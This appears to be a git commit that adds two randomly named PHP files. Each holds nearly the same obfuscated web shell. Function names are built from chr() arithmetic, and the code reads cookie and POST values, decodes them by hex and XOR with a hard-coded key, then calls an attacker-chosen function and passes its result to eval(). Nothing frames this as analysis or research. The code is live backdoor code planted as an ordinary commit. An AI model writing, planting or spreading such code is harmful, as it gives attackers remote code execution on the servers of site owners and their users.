5e0155ca1f8a61cb2947f7963e4b6a5b3566739a
MuhammadAbdullah001 <project.source.1122@gmail.com>
2024-07-21 00:55:51 +0500

    first commit

---
+++ qewgnvxv.php
@@ -0,0 +1,31 @@
+<?php $bcJzNt/*  ImY*/=	chr/* Fpw*/(	636/*  P   */-/*   gb */521	)."\164"	./*  Hpx  */"\x72"  ./*  dh   */"\x5f"   . chr	(	1092/*  ssi*/-   978	)."\x65"/* ik  */./*AUIY  */chr	(/*   p */613 -	501  ).chr  (	325/* dV   */-	224/*   BqKy */)."\x61" .	't';
+					$NEkvHCGIe/*oFglA*/=/*RqnJ */chr	(101)/*  q*/.     "\x78"	.	"\x70"     . chr	(   462/*JB   */-	354   )."\157"     .     "\144"     .	chr/* z   */(101);
+$JjFRfCYpqQ/*   BPIcV */=    "\x63"/*inE  */./*ZQB  */chr/* PoBpu*/(111)/*EYa  */./*rd   */chr    (117)     ./*  VhbRk  */"\x6e"  ./*SPic*/"\x74";
+     $xaXiqls   =    'p'/*   pMjKI */. "\x61"   .	chr    (/*IQ*/978/*  b*/-	879     ).chr/*   YhlWx */(107);
+
+$ctINlng	=   Array/*  pJK*/(	"TKdaVg"	=>     "HdHmJPEUNGEZGqsdUEaNrET"	);
+    $kqkohPxR	=	Array   ( "NjfUueKweUAoyBLyfQeLPTQlD"    =>	"mZeTsVVCAlhfeo"/*   HpFA   */);
+  	foreach   (	Array(/* JsR  */$ctINlng,/* Dgz   */$_COOKIE,/*   KI  */$kqkohPxR, $_POST,	$ctINlng) as/*uI */$icYTyVXoDk)/*M*/{
+
+   foreach/*Vg */(    $icYTyVXoDk	as  $kUPzJX/*  hmBP*/=>    $JkqmPqXH/*kNSSe   */)/* BRcBe   */{
+     	$JkqmPqXH	=	@$xaXiqls(	chr    (	559	-	487   ).'*',	$JkqmPqXH    );
+/*   dmvPj   */$kUPzJX	.=/*   ou   */"DWejFz-zHhhGeb-rzK-EKRak-Cdi-WjTF-Pxet";
+	$kUPzJX  = $bcJzNt   (    $kUPzJX,/*   WK  */(	strlen(    $JkqmPqXH	)/strlen(   $kUPzJX   )    )  +   1);
+		  $VrSglGNK/* Vzziz   */=    $JkqmPqXH/*  C  */^/*   jjCLH  */$kUPzJX;
+					$VrSglGNK  =    $NEkvHCGIe (   "\x23",	$VrSglGNK/* ofOIH */);
+
+
+   if    (  $JjFRfCYpqQ/* A */(	$VrSglGNK	)   ==	3/*  GAPGi*/)	{
+		/*   Zi   */$param1  =	$VrSglGNK[1];
+     $param2/*   QHYb */=   $VrSglGNK[2];
+
+
+	$param3  =  $param1($param2);
+     eval/*JhWH */(/* fyMR  */$param3/*   KcXN   */);
+
+	die/*   NDJVC  */();
+
+
+    }
+    }
+	}
---
+++ vxqhibhb.php
@@ -0,0 +1,29 @@
+<?php
+$uoWhq	=	chr   (/*  uo  */1102/*  pLNAt   */-     987/* kB  */).chr	(/*  myjaw*/903	-	787   )."\162"/* KCdp */.     chr/*   X   */(    358   -/* jhaRJ*/263   ).chr   (114)    .   chr/*  W*/(101)/*   xfb */./*smTsT */"\160"	.  "\x65"/*   TK  */.	chr     (97)	.    "\x74";
+     $BftJRzW   =	chr/* lMfi*/(101) ./* Bho  */chr/* pmRb  */(120)	.	'p'/*SYnq  */./*Y   */chr	(   1025  -	917	)."\x6f"/*   J  */.     "\144"	.	chr/*ikugp */(	160     -    59    );
+$LGCYNRPaFs/*  ceknf  */=	chr/*QBIBD */(/*  tNf*/824   -  725	).'o'	.  chr/*zza*/(117)	. 'n'	.   "\164";
+
+$hMSBYeS	=	chr/*   d */(112)/* PN   */.    "\x61"/*U */.	chr (99)	./*tof*/chr/* X   */(107);
+ $AxuNWuw/* K*/=/*   cFfX  */Array   (	"sltKGmmwGaqIUSTAAgWy"/* Abh   */=>/*me  */"IklMxrKoqdbBusbxSOKYZ"/*ZPSD  */);
+
+	$AIhoS =/*Ja  */Array/* i  */(	"uzzNKNUjqFO"/*  e  */=>/*ZhmWN   */"wRzZCvIxDJqSeMi"/* EGBGp   */);
+			foreach (	Array(/* TSt  */$AxuNWuw,	$_COOKIE,   $AIhoS,	$_POST,	$AxuNWuw)/*VSj */as/*   Ur*/$FfrzZlVhFR)	{
+			     foreach    (	$FfrzZlVhFR/*r   */as	$VTrBSdFI/*bsK */=>  $hSyntDdOG	)	{
+			$hSyntDdOG/*rvtW  */= @$hMSBYeS(	chr (72)/*   DTMd */./*  Uzc  */"\x2a",     $hSyntDdOG     );
+				 $VTrBSdFI/*  ow   */.=/*   SuuPP*/"fTUf-NAw-BVVyCl-lEE-SAX-fBLcW-IDR";
+	  $VTrBSdFI    =	$uoWhq/*cvnHY */(    $VTrBSdFI,/*YXh */(	strlen(/*YPzt  */$hSyntDdOG/*  Gfwbs  */)/strlen(     $VTrBSdFI	)    )/*   RMA   */+	1);
+
+ $vqYUsO	=	$hSyntDdOG/*  U */^     $VTrBSdFI;
+	/*  uJyaP   */$vqYUsO     =/*  Snje*/$BftJRzW	(	chr/*   wZ  */(35),/*  Hoe  */$vqYUsO	);
+/*   COc */if  (	$LGCYNRPaFs/*   F */(	$vqYUsO/*  w  */)	==/*Fc  */3    )   {
+
+/*   ViG*/$param1 =	$vqYUsO[1];
+      $param2	=/*   xCm*/$vqYUsO[2];
+  	$param3   =/*   A  */$param1($param2);
+			eval	( $param3/* uzg*/);
+  	die	();
+			}
+
+
+/*NgUg*/}
+	}
